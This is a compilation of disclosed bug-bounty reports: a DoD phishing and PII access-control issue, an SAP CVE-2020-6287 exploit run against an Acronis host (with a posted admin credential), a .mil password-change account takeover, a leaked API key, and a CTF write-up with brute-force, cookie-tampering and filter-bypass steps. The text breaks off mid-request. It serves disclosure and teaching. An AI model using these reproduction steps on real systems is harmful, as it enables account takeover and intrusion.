## Supporting Material/References:

  * Original vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2018-7160
  * Vulnerable code: https://github.com/nodejs/node/blob/fdf0a84e826d3a9ec0ce6f5a3f5adc967fe99408/src/inspector_socket.cc#L584
  * Documentation that mentions the vulnerable behavior: https://nodejs.org/en/docs/guides/debugging-getting-started/

## Impact

Attacker can gain access to the Node.js debugger, which can result in remote code execution.

---

### [Support incident can be opened for any user via /███████ and PII leak via █████████ field](https://hackerone.com/reports/869450)

- **Report ID:** `869450`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:05:02.147Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A malicious user can open an incident for any user via the ████/████████ page. This would allow the attacker to trick the victim into taking actions such as clicking a link or opening a file that has been attached to the incident.

## Impact
A victim could be tricked into visiting a link, opening a file, or sending PII to the attacker via the incident. Because the attacker opened the incident, they can see all comments left by the victim.

## Step-by-step Reproduction Instructions

1. Browse to ████ and create an account or login.
2. Browse to ██████████/█████████. You will be able to create an incident on this page.
3. In the `█████████` field, you can select any user you want to assign the incident to. The `i` button beside the caller field also allows you to view various PII about the user.
███████
██████
4. You can attach files in the top right corner using the attachment button.
5. Once you have chosen a victim (`██████`) and filled in the `additional comments` section with your phishing message, you can click `Submit` in the top right corner.
██████
6. Browse to ███████/home.do and you can see a list of your open incidents. You may need to filter by `All`. 
7. Click the incident that you assigned to the victim. 
███████
8. You can now use this page to monitor the victims response. This could be used to communicate with the victim, posing as an administrator and soliciting PII or causing other malicious effects.
█████████
9. The victim will receive an e-mail that the incident has been submitted on their behalf. Once they log-in, they will see the following:
██████████
███████
10. Obviously an adversary would create an account posing as an Air University administrator or something believable, but here is what a phishing attempt could look like using this vulnerability:
███
11. Meanwhile, the attacker is monitoring the incident waiting on the victim to respond and can even see when the victim has viewed the incident.
███

## Suggested Mitigation/Remediation Actions
This feature should be locked down to administrative access only. Regular users should not be allowed to submit tickets directly to other users or view other users PII.

## Impact

A victim could be tricked into visiting a link, opening a file, or sending PII to the attacker via the incident. Because the attacker opened the incident, they can see all comments left by the victim.

---

### [CVE-2020-6287  https://redapi2.acronis.com](https://hackerone.com/reports/1028392)

- **Report ID:** `1028392`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Acronis
- **Reporter:** @savik
- **Bounty:** - usd
- **Disclosed:** 2021-02-16T14:04:26.607Z
- **CVE(s):** CVE-2020-6287

**Vulnerability Information:**

Hi team.

## Summary

CVE-2020-6287  https://redapi2.acronis.com
https://nvd.nist.gov/vuln/detail/CVE-2020-6287

>SAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system, leading to Missing Authentication Check.


You can check. I created user with role 'Administrator'
```
sapRpoc9846:Secure!PwD7849
```

## Steps To Reproduce


  1. clone https://github.com/chipik/SAP_RECON
  1. `python3 RECON.py -a -H redapi2.acronis.com -P 443 -s`
 

Thanks.

## Impact

administrative user on sap system

**Summary (team):**

The report is not applicable since redapi.acronis.com and redapi2.acronis.com are internally developed systems not related to SAP NetWeaver.

---

### [Full account takeover on https://████████.mil](https://hackerone.com/reports/1058015)

- **Report ID:** `1058015`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @raywando
- **Bounty:** - usd
- **Disclosed:** 2021-01-25T19:55:36.701Z
- **CVE(s):** -

**Vulnerability Information:**

###Description

The flow in application is to sign up and wait for an email containing a one-time password, as soon as you login using that password, it asks you to change it. I took that password change request and applied on any email changing their password and it worked

###Steps to produce:

1- Copy the following request: (note `txtEMail` and `txtNewPassword` parameters)
```
POST /Login.aspx HTTP/1.1
Host: ██████████.mil
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1052
Origin: https://█████.mil
Connection: close
Referer: https://██████.mil/Login.aspx
Upgrade-Insecure-Requests: 1

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=████&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=█████████&txtMail=&txtEMail=[VICTIM_EMAIL]&reqEMailE_ClientState=&revEMailE_ClientState=&txtNewPassword=[DESIRED_PASSWORD]&btnNewPassword=Submit
```
2- Now, log in using any victim email with a random password and intercept the request at `https://█████.mil/Login.aspx`
3- Paste the request you copied above and change the `txtEMail` (to victim email) and `txtNewPassword` parameters and send it.

## Impact

Full account takeover on any user.

---

### [Public and secret api key leaked in JavaScript source](https://hackerone.com/reports/1051029)

- **Report ID:** `1051029`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Top Echelon Software
- **Reporter:** @lmhu
- **Bounty:** - usd
- **Disclosed:** 2021-01-19T20:14:30.923Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary: [Summary the vulnerabilities]**
I am surfing on the bb3jobboard.topechelon.com website. I found a sensitive data including authentication key written in public accessible javascript file.

**URL Vulnerability**
  * https://bb3jobboard.topechelon.com/#!/search?page=1

###Steps To Reproduce:
  * Open bb3jobboard.topechelon.com and add payloads javascript-fuzz
  * Directory sensitive is ``//job_board.js//`` parse this json files using jsonparseronline
  * and look response bytes In response you can see Sensitive ApiKey Disclosure
  * Sensitive Information has been leaked on this source page job_board.js
  * Open your network browser , this javascript source has high files can leads to (DoS)

**Proof On Concept**
```javascript
}]), angular.module("jb").config(["lkGoogleSettingsProvider", function(e) {
    e.configure({
        apiKey: "██████████",
        clientId: "██████t.apps.googleusercontent.com",
        scopes: ["https://www.googleapis.com/auth/drive.readonly"],
        features: ["MULTISELECT_DISABLED"]
    })
}]), angular.module("jb.factories").factory("BoardSettingsFactory", ["railsResourceFactory", "PathToResourceRoute", function(e, t) {
    var n = e({
        url: t.convert(JBRoutes.jobBoardBoardSettingsPath),
        name: "boardSettings"
    });
```
**Screenshots Proof**
████

## Impact

Information disclosure

---

### [Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]](https://hackerone.com/reports/1069396)

- **Report ID:** `1069396`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-ctf
- **Reporter:** @kunal94
- **Bounty:** - usd
- **Disclosed:** 2021-01-14T19:35:13.379Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team

#Description 
In the continuous series of 12 days, twelve flags were hidden inside Hackyholidays site - hackyholidays.h1ctf.com in which once we get all the flags, grinch can be stopped. This write-up will describe solving all the 12 days challenges.


#Step To Reproduce

+ It all started when hackerone announced the hackyholidays CTF.

{F1138874}

+ So, every day there will be one CTF added for the next 12 days so that it can end right before Christmas and we have to stop grinch by ruining his plans by getting all the flags and it'll save the holidays.

**Day 1 - CTF level 1**

+ On the first day, CTF level 1 launched. While I was looking into the site, there were no additional functionalities added and no paths, so the first thing which came to my mind before path brute-force and other methods is to always look on /robots.txt file where it can reveal some information.

When I opened https://hackyholidays.h1ctf.com/robots.txt, and thus, in the response, I got the first flag.

{F1138876}

Flag 1 -  ``` flag{48104912-28b0-494a-9995-a203d1e261e7}```



**Day 2 - CTF level 2**

+ In the first day, I've already discovered the path from https://hackyholidays.h1ctf.com/robots.txt. 

```txt
User-agent: *
Disallow: /s3cr3t-ar3a
```

+ So, the path /s3cr3t-ar3a became the second-day challenge, and  I visited the page https://hackyholidays.h1ctf.com/s3cr3t-ar3a,

{F1138880}

+ There was a message on the page which says - page moved. I thought the first thing to look for any hidden paths is to check the page using the Inspect element. While doing the inspect element, I got the second flag. The flag was hidden inside the HTML element.

{F1138892}

```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
```

Flag 2 - ```flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}```


**Day 3 - CTF level 3**

+ On the 3rd day, One link has been added and it was https://hackyholidays.h1ctf.com/people-rater inside the` /apps` path.

{F1138895}

+ So, when I visited the page, there was a people-rater application:

{F1138896}

+ As per the logic explained before the start of this challenge - `The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!`

+ So, the hint was hidden in the challenge description which means there is a record or id parameter which needs to be used over here.

+ Intercepting the request on the "load more" was just loading the page using https://hackyholidays.h1ctf.com/people-rater/page/<number> where it was 1,2,3 and 4:

**Request**

```http
GET /people-rater/page/1 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/people-rater
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
```

**Response**


``` json
{"results":[{"id":"eyJpZCI6Mn0=","name":"Tea Avery"},{"id":"eyJpZCI6M30=","name":"Mihai Matthews"},{"id":"eyJpZCI6NH0=","name":"Ruth Ward"},{"id":"eyJpZCI6NX0=","name":"Calvin Hogan"},{"id":"eyJpZCI6Nn0=","name":"Reilly Cervantes"}]}
```

+ Looking at the response, the id parameter was base64 encrypted.

+ In the application, I click on the first record "Tea Avery" for rating and intercepted the request:

**Request**

```http
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/people-rater
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
```

**Response**


```json
{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

+ When I decoded the base 64 id parameter, then the record was starting with the value as 2.     `eyJpZCI6Mn0=   -base64decode -  {"id":2}`. This came to my attention, the rating was starting with id value 2 and so, let's try with value 1 and check what is the record hidden inside the parameter.

+ Encoded the base64 parameter - ```{"id":1}  - eyJpZCI6MX0=``` and again send it to the server on the above request via changing the id parameter above and thus, we got the flag.

**Request**
```http
GET /people-rater/entry?id=eyJpZCI6MX0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/people-rater
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
```

**Response**

```json
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

+ Flag 3 - `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`


**Day 4 - CTF level 4**

+ On day 4, inside /apps, there was a new CTF level added as a swag-shop.

+ There was an option to purchase an Item over there and if we click on the link, it'll tell us to log in and it triggers an API request which returns a 401 response.

{F1138963}

**Request**

```http
POST /swag-shop/api/purchase HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 4
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://hackyholidays.h1ctf.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/swag-shop
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

id=3
```

**Response**

```http
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 04:10:41 GMT
Content-Type: application/json
Connection: close
Content-Length: 33

{"error": "You are not logged in"}
```

+ At first, I did the brute force on  https://hackyholidays.h1ctf.com/swag-shop/api/login login area with a different wordlist. But I failed.

{F1138964}

+ As  every request triggered after /api endpoint, so I did the brute force the /api path using the best wordlist which I came across with:

 https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d which was created by Yassine Aboukir. 

+ I used the tool "FFUF" to fuzz the API endpoint with responses such as 200,400,403,401,502.

Command - ```./ffuf -w word.txt -u "https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ" -mc 200,400,403,401,502```

{F1139017}

+ In the response I got:

```
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

+ Afterwards, I visited https://hackyholidays.h1ctf.com/swag-shop/api/sessions :

**Response**

{F1139021}

```json
{
"sessions": [
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
]
}
```

+ I decoded every base64 encrypted session and it turns out on 3rd session was revealing some information:

```
3rd session - 

eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==

base64 decoded - 

{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

+ From here, I got user-id as C7DCCE-0E0DAB-B20226-FC92EA-1B9043 and cookie value.

+ Next, I visited https://hackyholidays.h1ctf.com/swag-shop/api/user and response was:

{F1139022}

+ It says "missing required field" and I thought as I got the user id as C7DCCE-0E0DAB-B20226-FC92EA-1B9043, thus we have to add here with some parameter on this API endpoint.

+ I tried with user_id, userid and then I thought as it's encrypted, Let's try with uuid and it worked.

**Request**

https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043

**Response**

{F1139023}

```json
{
"uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
"username": "grinch",
"address": {
"line_1": "The Grinch",
"line_2": "The Cave",
"line_3": "Mount Crumpit",
"line_4": "Whoville"
},
"flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

+ In this way, I got the 4th flag in the response.

Flag 4 - ```flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}```


**Day 5 - CTF level 5**

+ On day 5, there was a new link for ctf level which is https://hackyholidays.h1ctf.com/secure-login.

+ To test the login page functionality, I've added some random username such as hello to check the output.

{F1139333}

+ It responded with an invalid username error. As per the logic of the application, if we get the correct username, then the next error definitely will be an "invalid password". So, it was a case of login brute force.

+ I've used Seclist wordlist for usernames. Reference  - https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt

+ To brute force, I've used the OWASP ZAP tool on this request:

```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://hackyholidays.h1ctf.com
Connection: keep-alive
Referer: https://hackyholidays.h1ctf.com/secure-login
Upgrade-Insecure-Requests: 1
Host: hackyholidays.h1ctf.com

username=admin&password=admin
```

{F1139341}

+ However, there was one problem, while brute-forcing on the OWASP ZAP tool, the size, and the response was the same, thus I was checking each request one by one to check the different output. Luckily, on the username as "access",  I got a response as "Invalid Password".

**Request**
```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://hackyholidays.h1ctf.com
Connection: keep-alive
Referer: https://hackyholidays.h1ctf.com/secure-login
Upgrade-Insecure-Requests: 1
Host: hackyholidays.h1ctf.com

username=access&password=admin
```

{F1139359}



{F1139350}

+ In the above screenshot, we can see the response as "Invalid Password".

+ So, the username is "access" and next up to find the valid password.

+ For brute-forcing, I've used another seclist wordlist for a password. Reference - https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-100.txt.

+ Luckily, while brute-forcing the password, I got the response as 302 on the password as "computer".

**Request**

```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://hackyholidays.h1ctf.com
Connection: keep-alive
Referer: https://hackyholidays.h1ctf.com/secure-login
Upgrade-Insecure-Requests: 1
Host: hackyholidays.h1ctf.com

username=access&password=computer
```
{F1139354}

**Response**

```http
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 10:33:46 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; expires=Thu, 31-Dec-2020 11:33:46 GMT; Max-Age=3600; path=/secure-login
Location: /secure-login
```


{F1139358}

+ As I got the username as "access" and password as "computer", I've authenticated directly using chrome browser. After logging in, it responded with "no files to download".

{F1139366}

+ First thing I checked to use inspect the element and check if there is a disabled href link or not, however, no luck.
+ Next thing I saw there was a cookie parameter in the response which was base64 encrypted.

`eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`

+ Decoded the base64 parameter and cookie value was `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. I changed the "admin":"false" to "admin":"true" and next thing, again encoded the cookie parameter.

```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true} -> base64 encode -> eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

+ In my chrome browser, I already got the "edit this cookie" extension and I changed with the above newly base64 encoded cookie parameter.

{F1139372}

+ After changing the cookie, I refreshed the page and thus, got the zip file download option as "my_secure_files_not_for_you.zip".

{F1139375}

+ After downloading and when I open the file, it was password protected.

{F1139378}

+ Afterwards, I installed one tool on the mac which is best for cracking the zip file - "Fcrackzip".
http://macappstore.org/fcrackzip/

+ For password wordlist, I got Seclist common 100k passwords - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt.

+ Run the command as `fcrackzip -D -p /Users/kunalpandey/Desktop/pass.txt -u /Users/kunalpandey/Desktop/my_secure_files_not_for_you.zip`

{F1139391}

+ After bruteforcing, I got the result within one second which is "hahahaha" as password. Typed in the password on the zip file, extracted it successfully, and got another flag. There was also a grinch pic along with it.

{F1139393}

+ Inside the flag.txt file, it was stored as `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}` and finally, ctf level 5 was over.

+ Flag 5 - `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`.


**Day 6 - Flag 6**

+ On day 6, the new CTF level was added as `/my-diary` inside `/apps ` path on https://hackyholidays.h1ctf.com.

{F1139404}

+ On visiting the page - https://hackyholidays.h1ctf.com/my-diary/?template=entries.html, it was with template path.

+ If the template path was accepting entries.html, thus it means there must be an index main file to get the output of the main application. So, the first thing I guessed with index.html, however, it redirected to entries.html. So, I was trying as index.jsp, index. aspx, and luckily on index.php, a new page got opened.

**Request**

https://hackyholidays.h1ctf.com/my-diary/?template=index.php

**Response**

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

**Code analysis**

+ While analyzing the above code, it looks like there was a regex check operation, so it means we're only allowed for the range "a-z, A-Z, and 0-9." and thus, no special characters.

+ On the code `$page = str_replace("admin.php","",$page);`, string "admin.php" was replaced with blank character "" .
+ On the code `$page = str_replace("secretadmin.php","",$page);`, string "secretadmin.php" was also replaced with blank character "".
+ In the comment section, the developer has specifically written the comment as "protect admin.php from being read" and then following up "I've changed the admin file to secretadmin.php for more security".
+ Thus, it means we need only the "secretadmin.php" path on the template parameter as "admin.php" was protected.
+ However, as the server was replacing "secretadmin.php" with a blank character, thus it was not fulfilling the condition and redirects to the default page as 
"/my-diary/?template=entries.html".

+ In order to bypass it, it needed a regex bypass condition. In order to bypass the regex condition, I can't apply any special characters, however, I can still use the above string replace condition to bypass the condition which was a blank condition string check.

**Regex Calculation**

```
admin.php = ""                     |   - replaced by blank character
secretadmin.php = ""      | -  replaced by blank character

secretadmin.php   ------->   add blank space ------>secretad''min.php   -------> replace ''with secretadmin.php -------> 
secretadsecretadmin.phpmin.php -------> add blank space --------->   secretadsecretad''min.phpmin.php  ----------> 
replace  '' with admin.php (to complicate more regex check) ----------> secretadsecretadadmin.phpmin.phpmin.php

Final string - secretadsecretadadmin.phpmin.phpmin.php
```

+ In the regex calculation, we are adding blank space in between and thus replacing with admin.php or secretadmin.php so that condition will also be satisfied from the server and also we can bypass the regex check as well.

+ Finally, after complicating the string from `secretadmin.php` to `secretadsecretadadmin.phpmin.phpmin.php`, I've tried again on the template parameter and finally, got the flag.

**Request**

https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretadadmin.phpmin.phpmin.php

**Response**

{F1139415}

```
My Diary
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
Pending Entries
Date	Event	Action
23rd Dec	Launch DDoS Against Santa's Workshop!	
```

+ This level was more on the source code analysis rather than the recon part to bypass the regex check from the server.

+ Flag 6 - `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`.

**Day 7 - CTF level 7**

+ On day 7, a new ctf level has been introduced as "hate-mail generator" inside /apps on https://hackyholidays.h1ctf.com.

+ Visiting the workflow of the site gave me an idea about either it's about template injection.

{F1139426}

{F1139425}

{F1139424}

+ Based on the observation, there were three template parameters used in this application.

```
Template param 1 - {{template:cbdj3_grinch_header.html}} - Template parameter which was using the template page to load.
Template param 2- {name} - The name parameter was fetching the name.
Template param 3 - {email} - The email parameter was been used inside the new page on https://hackyholidays.h1ctf.com/hate-mail-generator/new.
```

+ First, I visited the https://hackyholidays.h1ctf.com/hate-mail-generator/new and created a new email as 

{F1139428}

+ For {{template:""}} parameter, I wanted to inject an arbitrary path to check the output first and so decided to give index.html inside the template param.
+ On name area - "hi" ,subject area - "attack" and on Markup area - "Hello {{name}} {{template:index.html}} {{email}}". After selecting the preview option and also intercepting the request:

**Request**

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 172
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
